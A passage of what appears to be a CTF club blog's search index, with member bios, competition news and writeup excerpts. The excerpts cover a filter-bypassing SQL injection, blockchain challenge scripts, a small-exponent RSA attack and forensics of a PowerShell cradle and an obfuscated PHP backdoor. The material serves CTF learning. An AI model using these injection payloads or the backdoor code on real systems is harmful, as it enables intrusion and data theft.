BKISC, Ho Chi Minh University of Technology.","tags":null,"title":"QuiUzumaki (Qui Do)","type":"authors"},{"authors":null,"categories":null,"content":"A weber from BKISC - BK Information Security Club. He is currently working for VNG Corporation in Vietnam.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"a3a74416035ea7f929986b75b6b43d43","permalink":"https://blog.bkisc.com/author/seadawn/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/seadawn/","section":"authors","summary":"A weber from BKISC - BK Information Security Club. He is currently working for VNG Corporation in Vietnam.","tags":null,"title":"SeaDawn","type":"authors"},{"authors":null,"categories":null,"content":"Some Background Informations I am Severus, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2023.\nStarted playing CTFs since September 2024, currently I am focusly learning in the Reverse Engineering (RE) field of CTF (Maybe I’ll learn some Binary Exploitation (PWN) later on).\nI am planning to have an career on Binary/Malware Analysis.\nNoticeable Achievements To be updated\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2f93fea4f78fcfef733d785de3d76512","permalink":"https://blog.bkisc.com/author/severus/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/severus/","section":"authors","summary":"Some Background Informations I am Severus, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2023.\nStarted playing CTFs since September 2024, currently I am focusly learning in the Reverse Engineering (RE) field of CTF (Maybe I’ll learn some Binary Exploitation (PWN) later on).","tags":null,"title":"Severus","type":"authors"},{"authors":null,"categories":null,"content":"Sphyraena (Dang Tien Manh) is a Computer Science student studying at Ho Chi Minh University of Technology.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"9002e3bca11376cee8b90310b775a316","permalink":"https://blog.bkisc.com/author/sphyraena/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/sphyraena/","section":"authors","summary":"Sphyraena (Dang Tien Manh) is a Computer Science student studying at Ho Chi Minh University of Technology.","tags":null,"title":"Sphyraena","type":"authors"},{"authors":["YanZY"],"categories":null,"content":"Some Background Informations I am YanZY, a Cryptographer from team BKISC, HCMC University of Technology.\nNo durian. No strawberry. No “mam tom”.\nAchievements Nothing yet.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"94d65575d66f47e390521a7dfa347424","permalink":"https://blog.bkisc.com/author/yanzy/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/yanzy/","section":"authors","summary":"Some Background Informations I am YanZY, a Cryptographer from team BKISC, HCMC University of Technology.\nNo durian. No strawberry. No “mam tom”.\nAchievements Nothing yet.","tags":null,"title":"YanZY","type":"authors"},{"authors":null,"categories":null,"content":"Background I am Zayn (sometimes Zyan), a Computer Science graduate of Ho Chi Minh University of Technology.\nAs a Capture-the-Flag player, my main interest in crypto (and sometimes reverse) challenges.\nAs a nerd, I love playing roguelite games (especially Hades).\nAchievements … … …\nYeh, nothing to look here.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"858c4e5369f0167bcff091431491c7d6","permalink":"https://blog.bkisc.com/author/zayn/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/zayn/","section":"authors","summary":"Background I am Zayn (sometimes Zyan), a Computer Science graduate of Ho Chi Minh University of Technology.\nAs a Capture-the-Flag player, my main interest in crypto (and sometimes reverse) challenges.","tags":null,"title":"Zayn","type":"authors"},{"authors":["Lê Hoàng"],"categories":null,"content":" writeup web-exploitation  Table of Contents  Statement Overview  First glance Filter   Filter bypass  Number Check No whitespaces Desired characters are blocked   Constructing payload  Our union select Without using a column name Combine with no spaces using parentheses Try it out Final touch   Put it all together Conclusion    Hi all, first time doing a writeup here 😉. This will be the Intigriti September 2023 challenge created by @sgrum0x. I wrote this writeup not just for experienced players but also for newbies. In short, this challenge can be solved by using parentheses for whitespaces filter and get a column without using its name.\n   Statement Featuring this month’s challenge will be an SQL injection challenge. At first glance, it is a table containing ID, username, email of some users.\n   There is also a Show Source button. Upon clicking it, we can have a look at the source code of the challenge.\n1... 2$max = 10; 34if (isset($_GET[\u0026#39;max\u0026#39;]) \u0026amp;\u0026amp; !is_array($_GET[\u0026#39;max\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;max\u0026#39;]\u0026gt;0) { 5$max = $_GET[\u0026#39;max\u0026#39;]; 6$words = [\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;;\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34; \u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;h\u0026#34;,\u0026#34;k\u0026#34;,\u0026#34;p\u0026#34;,\u0026#34;v\u0026#34;,\u0026#34;x\u0026#34;,\u0026#34;or\u0026#34;,\u0026#34;if\u0026#34;,\u0026#34;case\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;between\u0026#34;,\u0026#34;join\u0026#34;,\u0026#34;json\u0026#34;,\u0026#34;set\u0026#34;,\u0026#34;=\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;#\u0026#34;,\u0026#34;/\u0026#34;,\u0026#34;\\r\u0026#34;,\u0026#34;\\n\u0026#34;,\u0026#34;\\t\u0026#34;,\u0026#34;\\v\u0026#34;,\u0026#34;\\f\u0026#34;]; // list of characters to check 7 foreach ($words as $w) { 8if (preg_match(\u0026#34;#\u0026#34;.preg_quote($w).\u0026#34;#i\u0026#34;, $max)) { 9exit(\u0026#34;H4ckerzzzz\u0026#34;); 10} //no weird chars 11 } 12} 1314try{ 15//seen in production 16 $stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT id, name, email FROM users WHERE id\u0026lt;=$max\u0026#34;); 17$stmt-\u0026gt;execute(); 18$results = $stmt-\u0026gt;fetchAll(); 19} 20catch(\\PDOException $e){ 21exit(\u0026#34;ERROR: BROKEN QUERY\u0026#34;); 22} 23/* FYI 24CREATE TABLE users ( 25id INT AUTO_INCREMENT PRIMARY KEY, 26name VARCHAR(255) NOT NULL, 27email VARCHAR(255) UNIQUE NOT NULL, 28password VARCHAR(255) NOT NULL 29); 30*/ 31?\u0026gt;32... 33\u0026lt;td\u0026gt;\u0026lt;?= htmlspecialchars(strpos($row[\u0026#39;id\u0026#39;],\u0026#34;INTIGRITI\u0026#34;)===false?$row[\u0026#39;id\u0026#39;]:\u0026#34;REDACTED\u0026#34;); ?\u0026gt;\u0026lt;/td\u0026gt; 34\u0026lt;td\u0026gt;\u0026lt;?= htmlspecialchars(strpos($row[\u0026#39;name\u0026#39;],\u0026#34;INTIGRITI\u0026#34;)===false?$row[\u0026#39;name\u0026#39;]:\u0026#34;REDACTED\u0026#34;); ?\u0026gt;\u0026lt;/td\u0026gt; 35\u0026lt;td\u0026gt;\u0026lt;?= htmlspecialchars(strpos($row[\u0026#39;email\u0026#39;],\u0026#34;INTIGRITI\u0026#34;)===false?$row[\u0026#39;email\u0026#39;]:\u0026#34;REDACTED\u0026#34;); ?\u0026gt;\u0026lt;/td\u0026gt; 36... Upon reading the source code, I was able to guess that the flag will be in the column password which we need to leak it somehow using `SQL Injection``. So where is the injection point? What are the problems that we need to encounter? Let’s dive deeper.\nOverview First glance Upon reviewing the source code, we can easily find the SQL Injection endpoint.\n1$max = 10; 2... 3$max = $_GET[\u0026#39;max\u0026#39;]; 4... 5$stmt = $pdo-\u0026gt;prepare(\u0026#34;SELECT id, name, email FROM users WHERE id\u0026lt;=$max\u0026#34;); But it wouldn’t have been a challenge if it was this easy right 🥲? The variable $max must go through a god d@mn filter to be passed to the query.\nFilter Let’s take a look at the filter:\n1if (isset($_GET[\u0026#39;max\u0026#39;]) \u0026amp;\u0026amp; !is_array($_GET[\u0026#39;max\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;max\u0026#39;]\u0026gt;0) { 2$max = $_GET[\u0026#39;max\u0026#39;]; 3$words = [\u0026#34;\u0026#39;\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;;\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34; \u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;h\u0026#34;,\u0026#34;k\u0026#34;,\u0026#34;p\u0026#34;,\u0026#34;v\u0026#34;,\u0026#34;x\u0026#34;,\u0026#34;or\u0026#34;,\u0026#34;if\u0026#34;,\u0026#34;case\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;between\u0026#34;,\u0026#34;join\u0026#34;,\u0026#34;json\u0026#34;,\u0026#34;set\u0026#34;,\u0026#34;=\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;#\u0026#34;,\u0026#34;/\u0026#34;,\u0026#34;\\r\u0026#34;,\u0026#34;\\n\u0026#34;,\u0026#34;\\t\u0026#34;,\u0026#34;\\v\u0026#34;,\u0026#34;\\f\u0026#34;]; // list of characters to check 4 foreach ($words as $w) { 5if (preg_match(\u0026#34;#\u0026#34;.preg_quote($w).\u0026#34;#i\u0026#34;, $max)) { 6exit(\u0026#34;H4ckerzzzz\u0026#34;); 7} //no weird chars 8 } 9} In short, there are 2 processes the filter performs:\n First, it checks the query $_GET[\u0026#39;max\u0026#39;] if it is an array and greater than 0. If it satisfies the condition, it assigns $max with the query $_GET[\u0026#39;max\u0026#39;], and then it performs a blacklist case insensitive check.  Filter bypass Number Check First up, in order to get through the if statement, the max must greater than 0. This is easy as stated in PHP Documentation.   So we only need a number \u0026gt; 0 at the first character of the payload, we’re good to move on.\nNo whitespaces Any payloads that contain white space or newline characters are filtered.\nComments for whitespaces will fail as it blocks character /.\nThere are a few payloads with alternative characters, unicodes that I have tried and failed like: %a0, %09, %0a, ...\nThere are still other ways.\nTaking this from Hacktricks, we may already find the payload we need: ?max=(1)and(1)=(1).\nNice👌.\nHowever, if you apply this right away it would not work as it requires a leading numeric character in the payload. We can use arithmetic operators to utilize this.\nOperator * multiply is not filtered. ?max=1*(2)and(1)=(1)\nDesired characters are blocked We can already construct a payload for Union-Based SQL Injection.\nThe payload for it may be: 1 union select 1,2,password from users\nBad news: \u0026#34;password\u0026#34; has character a “a” which is filtered.\nGood news: Hacktricks also offers us another way around.\n-- This is an example with 3 columns that will extract the column number 3 -1UNIONSELECT0,0,0,F.3FROM(SELECT1,2,3UNIONSELECT*FROMdemo)F;Constructing payload Our union select Let’s start with making our union select, provided that there are no filters applied.\nIt would be:\n1*2UNIONSELECT1,2,passwordFROMusersWithout using a column name Column \u0026#34;password\u0026#34; is the fourth column of the table users. So the …","date":1695686400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1695686400,"objectID":"2a1a237be43f4b8f1da26f427e2d7a9d","permalink":"https://blog.bkisc.com/blog/hoangdayne/intigrity-monthly-0923/","publishdate":"2022-10-03T11:59:00Z","relpermalink":"/blog/hoangdayne/intigrity-monthly-0923/","section":"blog","summary":"SQL injection filter bypass, with no spaces and without calling column name.","tags":["writeup","web-exploitation"],"title":"Writeup for Intigriti September Challenge 2023","type":"blog"},{"authors":null,"categories":null,"content":"Congratulations to Minh Le Hong for becoming one of the 15 representatives from Asia to participate in the International Cybersecurity Challenge (ICC).\nRecently, at the Asian Cyber Security Challenge (ACSC), Minh Le Hong - a member of the BKISC Information Security Club - achieved 2nd place in Vietnam and 13th place in Asia. This achievement has helped him to be selected as one of 15 representatives from Asia to participate in the ICC, which will take place in the United States soon.\nThe International Cybersecurity Challenge (ICC) is an international competition that attracts outstanding talents from all continents of the world, aiming to promote knowledge and skills in cybersecurity. The competition is organized by the European Network and Information Security Agency (ENISA) in cooperation with regional organizations, and will take place from July 31st to August 4th. The competition is organized with the goal of contributing to raising awareness about cybersecurity risks and creating opportunities for young talents to exchange and develop in the field of security in general.\nOnce again, the club congratulates Minh Le Hong on his outstanding achievement. We hope that he and his fellow Asian representatives will compete to their fullest and achieve many successes on the international stage!\n","date":1686096e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1686096e3,"objectID":"7433694406aac085042bb53f7964a413","permalink":"https://blog.bkisc.com/post/23-06-07-icc-2023/","publishdate":"2023-06-07T00:00:00Z","relpermalink":"/post/23-06-07-icc-2023/","section":"post","summary":"Congratulations to Minh Le Hong for becoming one of the 15 representatives from Asia to participate in the International Cybersecurity Challenge (ICC).\nRecently, at the Asian Cyber Security Challenge (ACSC), Minh Le Hong - a member of the BKISC Information Security Club - achieved 2nd place in Vietnam and 13th place in Asia.","tags":null,"title":"BKISC member to represent Asia in International Cybersecurity Challenge 2023","type":"post"},{"authors":null,"categories":null,"content":"On March 25th, 2023, BKISC sent 4 teams - Gavai, pwnhub, CAPTCHA, and MTBP Starter, to participate in the Hacktheon Sejong 2023 Qualifiers. After 8 hours of competition with teams in the area, all 4 teams successfully advanced to the next round of the tournament.\nThe members from 2 teams, Gavai and pwnhub, will be sent to participate in the Finals of Hacktheon Sejong, taking place on May 11th-12th, 2023 in Sejong, South Korea.\n","date":1679961600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679961600,"objectID":"0005706df10abdb433184cb2e2b92248","permalink":"https://blog.bkisc.com/post/23-03-28-hacktheon-sejong-2023/","publishdate":"2023-03-28T00:00:00Z","relpermalink":"/post/23-03-28-hacktheon-sejong-2023/","section":"post","summary":"On March 25th, 2023, BKISC sent 4 teams - Gavai, pwnhub, CAPTCHA, and MTBP Starter, to participate in the Hacktheon Sejong 2023 Qualifiers. After 8 hours of competition with teams in the area, all 4 teams successfully advanced to the next round of the tournament.","tags":null,"title":"BKISC team qualified for Hacktheon Sejong 2023 Finals","type":"post"},{"authors":null,"categories":null,"content":"After 5 days participating in the Cyber Apocalypse 2023: The Cursed Mission (March 18th - 23rd, 2023), BKISC finished the race at 29th place out of 6483 teams, surpassed 60/74 challenges and gained a total of 18175 points.\nAll the challenges that the team has solved during the 5-day competition already have detailed solutions by us, which you can refer to below:\n  Writeup: Blockchain\n  Writeup: Cryptography\n  Writeup: Forensics\n  Writeup: Hardware\n  Writeup: Machine Learning\n  Writeup: Miscellaneous\n  Writeup: Pwnable\n  Writeup: Reverse Engineering\n  Writeup: Web Exploitation\n  ","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"16fa388fda140107bad1bee0698ac0c5","permalink":"https://blog.bkisc.com/post/23-03-27-htb-2023/","publishdate":"2023-03-27T00:00:00Z","relpermalink":"/post/23-03-27-htb-2023/","section":"post","summary":"After 5 days participating in the Cyber Apocalypse 2023: The Cursed Mission (March 18th - 23rd, 2023), BKISC finished the race at 29th place out of 6483 teams, surpassed 60/74 challenges and gained a total of 18175 points.","tags":null,"title":"Cyber Apocalypse 2023 - The Cursed Mission CTF Results \u0026 Writeups","type":"post"},{"authors":["Dang \"midas\" Le","BaoDoktah"],"categories":null,"content":" ctf writeup blockchain htb-2023  Table of Contents  Navigating the Unknown Shooting 101 The Art Of Deception    Navigating the Unknown   Given zip: Get it here!\n  Description: Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories. Through practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations. Can you use your software to find your way through the blocks?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Blockchain\n  Difficulty: Very Easy\n  In this blockchain challenge, we were provided with two smart contracts: Setup.sol and Unknown.sol. Our goal was to solve the challenge by interacting with the contracts and ensuring that the isSolved() function in the Setup contract returns true.\nThe Setup.sol contract is responsible for initializing the challenge and providing us with the necessary information to interact with the Unknown.sol contract. The Setup contract deploys an instance of the Unknown contract and exposes the isSolved() function, which checks if the updated variable in the Unknown contract is set to true.\nThe Unknown.sol contract contains a single function, updateSensors(uint256 version), which sets the updated variable to true if the provided version argument is equal to 10.\nTo solve the challenge, we needed to call the updateSensors function in the Unknown contract with the correct version 10. To do this, we used the web3.py library to interact with the blockchain and the smart contracts. This is the python script:\nimport eth_account import web3 from web3 import Web3 PRIVATE_KEY= \u0026#34;REPLACE_YOUR_PRIVATE_KEY_HERE\u0026#34; RPC_URL=\u0026#34;http://REPLACE_YOUR_RPC_URL_HERE\u0026#34; SET_UP_ADRESSS=\u0026#34;REPLACE_YOUR_SET_UP_ADRESS_HERE\u0026#34; UNKNOWN_ADRESSS=\u0026#34;REPLACE_YOUR_UNKNOWN_ADRESS_HERE\u0026#34; w3=Web3(web3.HTTPProvider(RPC_URL)) my_account=eth_account.Account.from_key(PRIVATE_KEY) SET_UP_ABI = [ { \u0026#34;inputs\u0026#34;: [], \u0026#34;stateMutability\u0026#34;: \u0026#34;nonpayable\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;constructor\u0026#34; }, { \u0026#34;inputs\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;TARGET\u0026#34;, \u0026#34;outputs\u0026#34;: [ { \u0026#34;internalType\u0026#34;: \u0026#34;contract Unknown\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;address\u0026#34; } ], \u0026#34;stateMutability\u0026#34;: \u0026#34;view\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; }, { \u0026#34;inputs\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;isSolved\u0026#34;, \u0026#34;outputs\u0026#34;: [ { \u0026#34;internalType\u0026#34;: \u0026#34;bool\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;bool\u0026#34; } ], \u0026#34;stateMutability\u0026#34;: \u0026#34;view\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; } ] UNKNOWN_ABI = [ { \u0026#34;inputs\u0026#34;: [ { \u0026#34;internalType\u0026#34;: \u0026#34;uint256\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;version\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;uint256\u0026#34; } ], \u0026#34;name\u0026#34;: \u0026#34;updateSensors\u0026#34;, \u0026#34;outputs\u0026#34;: [], \u0026#34;stateMutability\u0026#34;: \u0026#34;nonpayable\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; }, { \u0026#34;inputs\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;updated\u0026#34;, \u0026#34;outputs\u0026#34;: [ { \u0026#34;internalType\u0026#34;: \u0026#34;bool\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;bool\u0026#34; } ], \u0026#34;stateMutability\u0026#34;: \u0026#34;view\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34; } ] setup_contract=w3.eth.contract(address=SET_UP_ADRESSS,abi=SET_UP_ABI) unknown_contract=w3.eth.contract(address=UNKNOWN_ADRESSS,abi=UNKNOWN_ABI) transaction = unknown_contract.functions.updateSensors(10).build_transaction({ \u0026#39;from\u0026#39;: my_account.address, \u0026#39;value\u0026#39;: 0, \u0026#39;gas\u0026#39;: 300000, \u0026#39;gasPrice\u0026#39;: w3.to_wei(\u0026#39;10\u0026#39;,\u0026#39;gwei\u0026#39;), \u0026#39;nonce\u0026#39;:w3.eth.get_transaction_count(my_account.address) }) signed_transaction=w3.eth.account.sign_transaction(transaction,PRIVATE_KEY) transaction_hash=w3.eth.send_raw_transaction(signed_transaction.rawTransaction) transaction_receipt=w3.eth.wait_for_transaction_receipt(transaction_hash) isSolve = setup_contract.functions.isSolved().call() print(\u0026#34;Challenge solved:\u0026#34; + {isSolve}) You can get both SET_UP_ABI and UNKNOWN_ABI by using Remix IDE to compile the contracts and get the ABIs. After running the script and we got the flag.\nFlag is: HTB{9P5_50FtW4R3_UPd4t3D}\nShooting 101   Given zip: Get it here!\n  Description: Your metallic body might have advanced targeting systems, but hitting a target is not just about technical proficiency. To truly master the art of targeting, you must learn to trust your instincts and develop a keen sense of intuition. During this training, you will emerge as a skilled marksman who can hit the targets with deadly precision. It’s about time to train and prove yourself in the Shooting Area, can you make it?\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Blockchain\n  Difficulty: Very Easy\n  In the Shooting 101 blockchain challenge, we have two smart contracts: Setup and ShootingArea. The goal of this challenge is to set the three boolean variables firstShot, secondShot, and thirdShot in the ShootingArea contract to true. The contract has a few functions with specific modifiers that ensure they can only be called under certain conditions.\nTo solve the challenge, we need to interact with the contracts and call the functions in the correct order:\n  Call the fallback function of the ShootingArea contract by sending a transaction with 32 bytes of zero data, setting firstShot to true.\n  Call the receive function of the …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"de8a665c1b5a73dd770493715c945d69","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-bc/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-bc/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Blockchain category.","tags":["ctf","writeup","blockchain","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Blockchain","type":"blog"},{"authors":["Onirique","FazeCT","dasHaus165","TN","Nothing"],"categories":null,"content":" ctf writeup crypto htb-2023  Table of Contents  Ancient Encodings Small StEps Perfect Synchronization  Problem statement Initial Analysis Solution method Results Conclusion   Multipage Recyclings  Problem Statement Initial Analysis Solution Method Results   Inside the Matrix  Problem Statement Initial Analysis Solution Method Results   Colliding Heritage  Initial Analysis Solution   Elliptic Labyrinth  Problem Statement Initial analysis Solution Method Results   Elliptic Labyrinth Revenge  Problem Statement Initial Analysis Implementation and Results   Biased Heritage Converging Visions Blokechain Original Post    Ancient Encodings   Given file: Get it here!\n  Description: Your initialization sequence requires loading various programs to gain the necessary knowledge and skills for your journey. Your first task is to learn the ancient encodings used by the aliens in their communication.\n  Category: Cryptography\n  Difficulty: Very Easy\n  We are given a Python script and a text file. Analyze the script, we get to know how the string is being encoded, which is Base 64 encode \u0026gt; Conversion to long from bytes \u0026gt; Hex.\nTo get the original string, we simply reverse the process, using CyberChef with the hex given in the text file.\nFlag is: HTB{1n_y0ur_j0urn3y_y0u_wi1l_se3_th15_enc0d1ngs_ev3rywher3}\nSmall StEps   Given file: Get it here!\n  Description: As you continue your journey, you must learn about the encryption method the aliens used to secure their communication from eavesdroppers. The engineering team has designed a challenge that emulates the exact parameters of the aliens’ encryption system, complete with instructions and a code snippet to connect to a mock alien server. Your task is to break it.\n  Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\n  Category: Cryptography\n  Difficulty: Very Easy\n  We are given two Python script. The server.py is to setup a server for RSA encryption. It will output n, e, ct upon connecting to the netcat server/run the Python script locally.\nSince e is always 3, we can use Low public exponent RSA attack to recover the initial message. In general, we only have to calculate cube root of ciphertext to get the plaintext.\nBelow is the implementation of the attack in Python.\nfrom Crypto.Util.number import long_to_bytes import gmpy2 n = 884883504927573976507811885368533220992278181011115684591381528075201937106582650631361008463165895850991665645858432026935373136174833729634068491453157 e = 3 ct = 70407336670535933819674104208890254240063781538460394662998902860952366439176467447947737680952277637330523818962104685553250402512989897886053 pt = gmpy2.iroot(ct, 3)[0] # Get cube root of ct print(long_to_bytes(pt)) Flag is: HTB{5ma1l_E-xp0n3nt}\nPerfect Synchronization   Given file: Get it here!\n  Description: The final stage of your initialization sequence is mastering cutting-edge technology tools that can be life-changing. One of these tools is quipqiup, an automated tool for frequency analysis and breaking substitution ciphers. This is the ultimate challenge, simulating the use of AES encryption to protect a message. Can you break it?\n  Category: Cryptography\n  Difficulty: Easy\n  The encryption is shown below:\nfrom os import urandom from Crypto.Cipher import AES from secret import MESSAGE assert all([x.isupper() or x in \u0026#39;{_}\u0026#39; for x in MESSAGE]) class Cipher: def __init__(self): self.salt = urandom(15) key = urandom(16) self.cipher = AES.new(key, AES.MODE_ECB) def encrypt(self, message): return [self.cipher.encrypt(c.encode() + self.salt) for c in message] def main(): cipher = Cipher() encrypted = cipher.encrypt(MESSAGE) encrypted = \u0026#34;\\n\u0026#34;.join([c.hex() for c in encrypted]) with open(\u0026#34;output.txt\u0026#34;, \u0026#39;w+\u0026#39;) as f: f.write(encrypted) if __name__ == \u0026#34;__main__\u0026#34;: main() Problem statement The Python script defines a Cipher class that generates a random salt and key, then encrypts a message using AES in ECB mode. The encrypted message is written to a file in hexadecimal format. The MESSAGE variable is imported from a separate file. Our mission is to recover the encrypted message and find the flag in it.\nInitial Analysis The randomness The author adds some randomnesses including key and salt to make the encryption more unpredictable. But if you look more closely into it, you will realize that the salt is just initialized once, and be padded for all characters in the message. It means the salt is not too much useful, it just shifts all characters by a constant value.\nThe AES encryption mode The author uses EBC mode - the weakest mode, to encrypt all shifted characters of the message.\nFor anyone who doesn’t know about ECB: ECB (Electronic Codebook) is one of the simplest modes of AES encryption, where each block of plaintext is encrypted separately using the same key.\nIn this mode, identical plaintext blocks will be encrypted to identical ciphertext blocks, making it vulnerable to attacks that exploit patterns in …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"aebeb7c0a862ef7d1da8a26271ea20f7","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-crypto/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-crypto/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Cryptography category.","tags":["ctf","writeup","crypto","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Cryptography","type":"blog"},{"authors":["FazeCT","BaoDoktah","Onirique"],"categories":null,"content":" ctf writeup forensics htb-2023  Table of Contents  Plaintext Tleasure Alien Cradle Extraterrestrial Persistence Roten Relic Maps Packet Cyclone Bashic Ransomware  1. Pcap file 2. Bash script analyze   Original Posts    Plaintext Tleasure   Given file: Get it here!\n  Description: Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.\n  Category: Forensics\n  Difficulty: Very Easy\n  We are given a network pcap file. Although we can solve this challenge using Wireshark, but to keep it simple for the very first challenge, we will use strings and grep to get the flag.\nHere we use strings to dump out strings from the pcap file, then use pipe (|) and grep to find for strings that match the flag format - HTB{.\nFlag is: HTB{th3s3_4l13ns_st1ll_us3_HTTP}\nAlien Cradle   Given file: Get it here!\n  Description: In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora’s close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?\n  Category: Forensics\n  Difficulty: Very Easy\n  For this challenge, we are given a Powershell Script file. In the script, the flag is being concatenated using some Powershell magic lines of code.\nFlag is: HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}\nExtraterrestrial Persistence   Given file: Get it here!\n  Description: There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?\n  Category: Forensics\n  Difficulty: Very Easy\n  In this challenge, we are given a shell script to look for the flag.\nFor the sake of understanding the flow of shell scripting, the script checks whether the username is Pandora and the hostname is linux_HQ. If the check is fulfilled, it starts the process to write the base64 decoded message into the file /usr/lib/systemd/system/service.service.\nThe decoded message turned out to contain the flag for our challenge.\nFlag is: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nRoten   Given zip: Get it here!\n  Description: The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyze, its up to you to save us.\n  Category: Forensics\n  Difficulty: Easy\n  After filtering the packets by http.request.method == POST, we saw an interesting packet there.\nThe packet 1929 has a MIME type of application/x-php, following the HTTP stream to see the php backdoor, we found this interesting php codes:\n\u0026lt;?php $pPziZoJiMpcu = 82; $liGBOKxsOGMz = array(); $iyzQ5h8qf6 = \u0026#34;\u0026#34; ; $iyzQ5h8qf6 .= \u0026#34;\u0026lt;nnyo ea\\$px-aloerl0=e r\\$0\u0026#39; weme Su rgsr s\\\u0026#34;eu\u0026gt;\\\u0026#34;e\u0026#39;Er= elmi)y ]_\u0026#39;t\u0026gt;bde e e =p xt\\\u0026#34;?ltps vdfic-xetrmsx\u0026#39;l0em0 o\\\u0026#34;oc\u0026amp;\u0026#39;t [r\\\u0026#34;e _e;eV.ncxm\u0026#39;vToil ,F y\u0026#34;; $iyzQ5h8qf6 .= \u0026#34;\u0026lt;r s -\u0026lt;a \\\u0026#34;op r_P\u0026lt; poeeihaeild /ds\\\u0026#34;se4bsxao1: r]du ;e\\$\u0026#39;o,t dn\\n)i\\$\u0026#39;me\u0026#39;maoate{e I!lb\u0026gt;\u0026#39;u btde .sr ege/ 